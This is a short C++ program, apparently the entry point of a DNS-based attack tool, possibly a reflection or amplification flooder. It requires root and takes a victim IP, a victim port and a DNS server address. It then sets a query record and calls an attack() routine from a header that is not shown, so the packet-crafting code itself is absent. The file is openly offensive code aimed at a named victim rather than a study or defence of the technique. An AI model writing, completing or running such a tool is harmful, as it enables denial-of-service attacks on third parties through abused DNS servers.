#include <unistd.h>

#include <cstdint>
#include <iostream>
#include <string>

#include "dns_attack.h"

int main(int argc, char **argv) {
  // Initial uid check and argument count check
  if (getuid() != 0) {
    std::cout << "You must be running as root!\n";
    return EXIT_FAILURE;
  }

  if (argc != 4) {
    std::cout << "Usage: ./dns_attack <victim_ip> <victim_port> <dns_server_ip>\n";
    return EXIT_FAILURE;
  }

  // Assignments to variables from the given arguments
  std::string targetIp(argv[1]);
  int targetPort = atoi(argv[2]);
  std::string dnsServerIp(argv[3]);
  // TODO: Set the record
  char record[] = "google.com";
  attack(targetIp, targetPort, dnsServerIp, record);
  return 0;
}
